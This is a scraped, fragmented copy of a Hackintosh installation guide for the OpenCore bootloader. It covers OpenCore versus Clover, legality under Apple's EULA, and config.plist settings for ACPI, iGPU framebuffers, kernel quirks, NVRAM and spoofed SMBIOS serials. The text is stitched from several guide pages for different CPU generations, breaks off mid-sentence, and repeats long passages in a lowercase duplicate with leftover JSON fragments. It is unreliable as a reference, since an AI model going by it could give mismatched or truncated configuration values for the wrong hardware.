Many developers including the organization Acidanthera (maker of most of your favorite kexts) won't provide support unless on OpenCore\n * Many firmware drivers being merged into OpenCore:\n   * APFS Support\n   * FileVault support\n   * Firmware patches\n\n\n# OpenCore's shortcomings\n\nThe majority of Clover's functionality is actually supported in OpenCore in the form of some quirk, however when transitioning you should pay close attention to OpenCore's missing features as this may or may not affect yourself:\n\n * Does not support booting MBR-based operating systems\n   * Work around is to chain-load rEFInd once in OpenCore\n * Does not support UEFI-based VBIOS patching\n   * This can be done in macOS however\n * Does not support automatic DeviceProperty injection for legacy GPUs\n   * ie.

Ivy Bridge XCPM patches\n * Does not support hiding specific drives\n * Does not support changing settings within OpenCore's menu\n * Does not patch PCIRoot UID value\n * Does not support macOS-only ACPI patching\n\n\n# Common Myths\n\n\n# Is OpenCore unstable as it's a beta?\n\nShort Answer: No\n\nLong Answer: No\n\nOpenCore's version number does not represent the quality of the project. Instead, it's more of a way to see the stepping stones of the project. Acidanthera still has much they'd like to do with the project including overall refinement and more feature support.\n\nFor example, OpenCore goes through proper security audits to ensure it complies with UEFI Secure Boot, and is the only Hackintosh bootloader to undergo these rigorous reviews and have such support.\n\nVersion 0.6.1 was originally designed to be the official release of OpenCore as it would have proper UEFI/Apple Secure Boot, and would be the 1 year anniversary of OpenCore's release as a public tool. However, due to circumstances around macOS Big Sur and the rewriting of OpenCore's prelinker to support it, it was decided to push off 1.0.0 for another year.\n\nCurrent road map:\n\n * 2019: Year of Beta\n * 2020: Year of Secure Boot\n * 2021: Year of Refinement\n\nSo please do not see the version number as a hindrance, instead as something to look forward to.\n\n\n# Does OpenCore always inject SMBIOS and ACPI data into other OSes?\n\nBy default, OpenCore will assume that all OSes should be treated equally in regards to ACPI and SMBIOS information. The reason for this thinking consists of three parts:\n\n * This allows for proper multiboot support, like with BootCamp\n * Avoids poorly made DSDTs and encourages proper ACPI practices\n * Avoids edge cases where info is injected several times, commonly seen with Clover\n   * i.e. How would you handle SMBIOS and ACPI data injection once you booted boot.efi, but then get kicked out? The changes are already in memory and so trying to undo them can be quite dangerous. This is why Clover's method is frowned upon.\n\nHowever, there are quirks in OpenCore that allow for SMBIOS injection to be macOS-limited by patching where macOS reads SMBIOS info from. The CustomSMIOSGuid quirk with CustomSMBIOSMode set to Custom can break in the future and so we only recommend this option in the event of certain software breaking in other OSes. For best stability, please disable these quirks.\n\n\n# Does OpenCore require a fresh install?\n\nNot at all in the event you have a \"Vanilla\" installation – what this refers to is whether the OS has tampered in any way, such as installing 3rd party kexts into the system volume or other unsupported modifications by Apple. When your system has been heavily tampered with, either by you or 3rd party utilities like Hackintool, we recommend a fresh install to avoid any potential issues.\n\nSpecial note for Clover users: please reset your NVRAM when installing with OpenCore. Many of Clover variables can conflict with OpenCore and macOS.\n\n * Note: Thinkpad laptops are known to be semi-bricked after an NVRAM reset in OpenCore, we recommend resetting NVRAM by updating the BIOS on these machines.\n\n\n# Does OpenCore only support limited versions of macOS?\n\nAs of OpenCore 0.6.2, you can now boot every Intel version of macOS going all the way back to OS X 10.4! Proper support however will depend on your hardware, so please verify yourself: Hardware Limitations\n\nmacOS Install Gallery\n\nAcidanthera has tested many versions, and I myself have run many versions of OS X on my old HP DC 7900 (Core2 Quad Q8300). Here's just a small gallery of what I've tested:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n# Does OpenCore support older hardware?\n\nAs of right now, the majority of Intel hardware is supported so long as the OS itself does! However please refer to the Hardware Limitations page for more info on what hardware is supported in what versions of OS X/macOS.\n\nCurrently, Intel's Yonah and newer series CPUs have been tested properly with OpenCore.\n\n\n# Does OpenCore support Windows/Linux booting?\n\nOpenCore will automatically detect Windows without any additional configuration. With OpenCore 0.7.3, OpenLinuxBoot was added to OpenCore as an EFI driver, which will automatically detect Linux partitions. This requires either ext4_x64.efi or btrfs_x64.efi depending on which format it used in your distro. For any OSes where their bootloader has an irregular path or name, you can simply add it to the BlessOverride section.\n\n\n# Legality of Hackintoshing\n\nWhere hackintoshing sits is in a legal grey area, mainly that while this is not illegal we are in fact breaking the EULA. The reason this is not illegal:\n\n * We are downloading macOS from Apple's servers directly\n * We are doing this as a non-profit organization for teaching and personal use\n   * People who plan to use their Hackintosh for work or want to resell them should refer to the Psystar case and their regional laws\n\nWhile the EULA states that macOS should only be installed on real Macs or virtual machines running on genuine Macs (sections 2B-i and 2B-iii), there is no enforceable law that outright bans this. However, sites that repackage and modify macOS installers do potentially risk the issue of DMCA takedowns and such.\n\n * Note: This is not legal advice, so please make the proper assessments yourself and discuss with your lawyers if you have any concerns.\n\n\n# Does macOS support NVIDIA GPUs?\n\nDue to issues revolving around NVIDIA support in newer versions of macOS, many users come to the conclusion that macOS never supported NVIDIA GPUs. Apple supported Macs with NVIDIA GPUs (such as the 2013 MacBook Pro with a Kepler dGPU) until the release of Monterey Beta 7. While there are community-made patches to bring back support, they require SIP (System Integrity Protection) to be disabled, disabling important security features in macOS.\n\nThe other issue has to do with any newer NVIDIA GPUs, as Apple stopped shipping machines with them and thus they never had official OS support from Apple. Instead, users had to rely on NVIDIA for 3rd party drivers. Due to issues with Apple's newly introduced Secure Boot, they could no longer support the Web Drivers and thus NVIDIA couldn't publish them for newer platforms limiting them to mac OS 10.13, High Sierra.\n\nFor more info on OS support, see here: GPU Buyers Guide",normalizedContent:"# why opencore over clover and others\n\nthis section contains a brief rundown as to why the community has been

making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly.

Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops (ie. with built-in displays) or for Intel NUCs (ie. standalone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n00001B59              Laptop   Recommended for HD 615, HD 620, HD 630, HD 640 and HD 650\n00001659              Laptop   Alternative value to 00001B59 if you have acceleration\n                               issues, and recommended for all HD and UHD 620 NUCs\n0000C087              Laptop   Recommended for Amber Lake's UHD 617 and Kaby Lake-R's UHD\n                               620\n00001E59              NUC      Recommended for HD 615\n00001B59              NUC      Recommended for HD 630\n02002659              NUC      Recommended for HD 640/650\n\n# Configuration Notes\n\n * In some cases where you cannot set the DVMT-prealloc of these cards to 64MB or higher in your UEFI Setup, you may get a kernel panic. Usually they're configured for 32MB of DVMT-prealloc, in that case add these values to the iGPU properties:\n\nKEY                        TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\n\n * For all UHD 620 users (Kaby Lake-R), you'll need a device-id spoof:\n\nKEY         TYPE   VALUE\ndevice-id   Data   16590000\n\n * HD 6xx users (UHD 6xx users are not concerned) may have some issues with output where plugging in a display out would cause a lock up (kernel panic); here are some patches to mitigate that (credit RehabMan). If you're having these lock ups, try the following sets of patches (try both, but only one set at a time):\n   \n   * con1 as 105, con2 as 204, both HDMI\n     \n     KEY                        TYPE   VALUE\n     framebuffer-con1-enable    Data   01000000\n     framebuffer-con1-alldata   Data   01050A00 00080000 87010000\n     framebuffer-con2-enable    Data   01000000\n     framebuffer-con2-alldata   Data   02040A00 00080000 87010000\n   \n   * con1 as 105, con2 as 306, HDMI and DP\n     \n     KEY                        TYPE   VALUE\n     framebuffer-con1-enable    Data   01000000\n     framebuffer-con1-alldata   Data   01050A00 00080000 87010000\n     framebuffer-con2-enable    Data   01000000\n     framebuffer-con2-alldata   Data   03060A00 00040000 87010000\n\nExplanation\n\nLet's take in consideration these 2 usual framebuffers:\n\n * 00001B59 which has the following BusID information:\n   \n   [0] busId: 0x00, pipe: 8, type: 0x00000002, flags: 0x00000098 - ConnectorLVDS\n   [2] busId: 0x04, pipe: 10, type: 0x00000800, flags: 0x00000187 - ConnectorHDMI\n   [3] busId: 0x06, pipe: 10, type: 0x00000400, flags: 0x00000187 - ConnectorDP\n   00000800 02000000 98000000\n   02040A00 00080000 87010000\n   03060A00 00040000 87010000\n   \n\n * and 00001659 which has the following BusID information:\n   \n   [0] busId: 0x00, pipe: 8, type: 0x00000002, flags: 0x00000098 - ConnectorLVDS\n   [1] busId: 0x05, pipe: 9, type: 0x00000400, flags: 0x00000187 - ConnectorDP\n   [2] busId: 0x04, pipe: 10, type: 0x00000800, flags: 0x00000187 - ConnectorHDMI\n   00000800 02000000 98000000\n   01050900 00040000 87010000\n   02040A00 00080000 87010000\n   \n\nWhich look similar at first glance, until you see the small details like the Port ID (the first 2 digits of each hex line). Both of the framebuffers are valid, but not all OEMs ship the same port configuration on all laptops (some have eDP for internal display, some have HDMI instead of DP ports, some have VGA and so on...).\n\nFor either framebuffer, the first port (port 00) is ConnectorLVDS (meaning the internal display), which is the same on both configurations, that's how you get a display out for macOS. The differences come to the 2 other ports:\n\n * 00001B59\n\n02040A00 00080000 87010000 --\x3e\n[2] busId: 0x04, pipe: 10, type: 0x00000800, flags: 0x00000187 - ConnectorHDMI\n\n03060A00 00040000 87010000 --\x3e\n[3] busId: 0x06, pipe: 10, type: 0x00000400, flags: 0x00000187 - ConnectorDP\n\n\n * 00001659\n\n01050900 00040000 87010000 --\x3e\n[1] busId: 0x05, pipe: 9, type: 0x00000400, flags: 0x00000187 - ConnectorDP\n\n02040A00 00080000 87010000 --\x3e\n[2] busId: 0x04, pipe: 10, type: 0x00000800, flags: 0x00000187 - ConnectorHDMI\n\n\nThe patches above have these effects:\n\n * Patchset 1:\n   * Convert second connector of the ports to 0105 with HDMI connector type\n   * Convert third connector of the ports to 0204 with HDMI connector type\n * Patchset 2:\n   * Convert second connector of the ports to 0105 with HDMI connector type\n   * Convert third connector of the ports to 0306 with DP connector type\n\nDepending on your real hardware setup, you might want to switch things up, but usually for most laptops, one of the two patches might be required, in case your outputs work out-of-the-box with no issues or crashes, you do not need these patches then.\n\nHow to read the BusID\n\nThe bits in the hex string are read as following:\n\n(taking 01050900 00040000 87010000 as example)\n\nBIT        NAME             VALUE\nBit 1      Port             01\nBit 2      Bus ID           05\nBit 3-4    Pipe Number      0900\nBit 5-8    Connector Type   00040000\nBit 9-12   Flags            87010000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present.

You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning.

making a config.plist may seem hard, it's not. it just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread

is set up via whatevergreen's framebuffer patching guide and is used for setting important igpu properties.\n\nthe config.plist doesn't already have a section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,ig-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops (ie. with built-in displays) or for intel nucs (ie. standalone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram and solid background for dock), then you likely need to try different aapl,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\naapl,ig-platform-id   type     comment\n00001b59              laptop   recommended for hd 615, hd 620, hd 630, hd 640 and hd 650\n00001659              laptop

0x00000400, flags: 0x00000187 - connectordp\n   00000800 02000000 98000000\n   02040a00 00080000 87010000\n   03060a00 00040000 87010000\n   \n\n * and 00001659 which has the following busid information:\n   \n   [0] busid: 0x00, pipe: 8, type: 0x00000002, flags: 0x00000098 - connectorlvds\n   [1] busid: 0x05, pipe: 9, type: 0x00000400, flags: 0x00000187 - connectordp\n   [2] busid: 0x04, pipe: 10, type: 0x00000800, flags: 0x00000187 - connectorhdmi\n   00000800 02000000 98000000\n   01050900 00040000 87010000\n   02040a00 00080000 87010000\n   \n\nwhich look similar at first glance, until you see the small details like the port id (the first 2 digits of each hex line). both of the framebuffers are valid, but not all oems ship the same port configuration on all laptops (some have edp for internal display, some have hdmi instead of dp ports, some have vga and so on...).\n\nfor either framebuffer, the first port (port 00) is connectorlvds (meaning the internal display), which is the same on both configurations, that's how you get a display out for macos. the differences come to the 2 other ports:\n\n * 00001b59\n\n02040a00 00080000 87010000 --\x3e\n[2] busid: 0x04, pipe: 10,

00040000 87010000 --\x3e\n[1] busid: 0x05, pipe: 9, type: 0x00000400, flags: 0x00000187 - connectordp\n\n02040a00 00080000 87010000 --\x3e\n[2] busid: 0x04, pipe: 10, type: 0x00000800, flags: 0x00000187 - connectorhdmi\n\n\nthe patches above have these effects:\n\n * patchset 1:\n   * convert second connector of the ports to 0105 with hdmi connector type\n   * convert third connector of the ports to 0204 with hdmi connector type\n * patchset 2:\n   * convert second connector of the ports to 0105 with hdmi connector type\n   * convert third connector of the ports to 0306 with dp connector type\n\ndepending on your real hardware setup, you might want to switch things up, but usually for most laptops, one of the two patches might be required, in case your outputs work out-of-the-box with no issues or crashes, you do not need these patches then.\n\nhow to read the busid\n\nthe bits in the hex string are read as following:\n\n(taking 01050900 00040000 87010000 as example)\n\nbit        name             value\nbit 1      port             01\nbit 2      bus id           05\nbit 3-4    pipe number      0900\nbit 5-8    connector type   00040000\nbit 9-12   flags

applealc's layout. applealc supported codecs.\n * you can delete this property outright as it's unused for us at this time\n\nfor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-ids present. more info on this is covered in the post-install page\n\n\n# delete\n\nremoves device properties from the map, for us we can ignore this\n\n\n#

can't be disabled in bios\n   * only applicable for ivy bridge and older\n     * note: broadwell and older require this when running 10.10 or older\n * applexcpmcfglock: yes\n   * only needed when cfg-lock can't be disabled in bios\n   * only applicable for haswell and newer\n     * note: ivy bridge-e is also included as it's xcpm capable\n * customsmbiosguid: no\n   * performs guid patching for updatesmbiosmode set to custom. usually relevant for dell laptops\n   * enabling this quirk with updatesmbiosmode custom mode can also disable smbios injection into \"non-apple\" oses however we do not endorse this method as it breaks bootcamp compatibility. use at your own risk\n * disableiomapper: yes\n   * needed to get around vt-d if either unable to disable in bios or needed for other operating systems, much better alternative to dart=0 as sip can stay on in catalina\n * disablelinkeditjettison: yes\n   * allows lilu and others to have more reliable performance without keepsyms=1\n * disablertcchecksum: no\n   * prevents applertc from writing to primary checksum (0x58-0x59), required for users who either receive bios reset or are sent into safe mode after reboot/shutdown\n * extendbtfeatureflags no\n   * helpful for those having continuity issues with non-apple/non-fenvi cards\n * lapickernelpanic: no\n   * disables kernel panic on ap core lapic interrupt, generally needed for hp systems. clover equivalent is kernel lapic\n * legacycommpage: no\n   * resolves ssse3 requirement for 64 bit cpus in macos, mainly relevant for 64-bit pentium 4 cpus(ie. prescott)\n * panicnokextdump: yes\n   * allows for reading kernel panics logs when kernel panics occur\n * powertimeoutkernelpanic: yes\n   * helps fix kernel panics relating to power changes with apple drivers in macos catalina, most notably with digital audio.\n * setapfstrimtimeout: -1\n   * sets trim timeout in microseconds for apfs filesystems on ssds, only applicable for macos 10.14 and newer with problematic ssds.\n * xhciportlimit: yes\n   * this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# scheme\n\nsettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-GPIO        Creates a stub so VoodooI2C can connect, for those having\n                 troubles getting VoodooI2C working can try SSDT-XOSI\n                 instead. Note that Intel NUCs do not need this\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT, this is not needed if you're using SSDT-GPIO\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be pass-through to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes. For most users, leave it as default.\n\n * ProtectMemoryRegions: YES\n   * Fixes shutdown/restart on some Chromebooks that would otherwise result in a AppleEFINVRAM kernel panic.\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProtectMemoryRegions: YES\n   * Patches memory region types for incorrectly mapped CSM/MMIO regions. Necessary for all Chromebooks that utilize coreboot UEFI firmware.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n00001619              Laptop   Recommended value for HD 515, HD 520, HD 530, HD 540, HD 550\n                               and P530\n00001E19              Laptop   Alternative for HD 515 if you have issues with the above\n                               entry\n00001B19              Laptop   Recommended value for HD 510\n00001E19              NUC      Recommended for HD 515\n02001619              NUC      Recommended for HD 520/530\n02002619              NUC      Recommended for HD 540/550\n05003B19              NUC      Recommended for HD 580\n\nNote: If booting macOS Ventura, you need to spoof your iGPU as the closest Kaby Lake model.\n\n# Configuration Notes\n\n * For HD 510 you will need to use a device-id spoof:\n\nKEY         TYPE   VALUE\ndevice-id   Data   02190000\n\n * For HD 550 and P530 (and potentially all HD P-series iGPUs), you may need to use device-id=16190000:\n\nKEY         TYPE   VALUE\ndevice-id   Data   16190000\n\n * In some cases where you cannot set the DVMT-prealloc of these cards to 64MB higher in your UEFI Setup, you may get a kernel panic. Usually they're configured for 32MB of DVMT-prealloc, in that case these values are added to your iGPU Properties\n\nKEY                        TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi.

The typical breakdown is as follows:\n\nSMBIOS           CPU TYPE                  GPU TYPE                                  DISPLAY SIZE   TOUCH ID\nMacBook9,1       Dual Core 7W(Low End)     iGPU: HD 515                              12\"            No\nMacBookPro13,1   Dual Core 15W(Low End)    iGPU: Iris 540                            13\"            No\nMacBookPro13,2   Dual Core 15W(High End)   iGPU: Iris 550                            13\"            Yes\nMacBookPro13,3   Quad Core 45W             iGPU: HD 530 + dGPU: Radeon Pro 450/455   15\"            Yes\niMac17,1         NUC Systems               iGPU: HD 530 + R9 290                     N/A            No\n\nNote 2: All of these SMBIOSes were dropped in macOS Ventura. If running macOS Ventura, use a Kaby Lake SMBIOS.\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               MacBookPro13,1 SMBIOS Info            #\n#######################################################\n\nType:         MacBookPro13,1\nSerial:       C02S3HYWGG7L\nBoard Serial: C02629102GUGPF7AD\nSmUUID:       3508AD44-B67D-4AD7-A109-7955130A1033\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired.

you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see

properties.\n\nthe config.plist doesn't already have a section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,ig-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram and solid background for dock), then you likely need to try different aapl,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\naapl,ig-platform-id   type     comment\n00001619

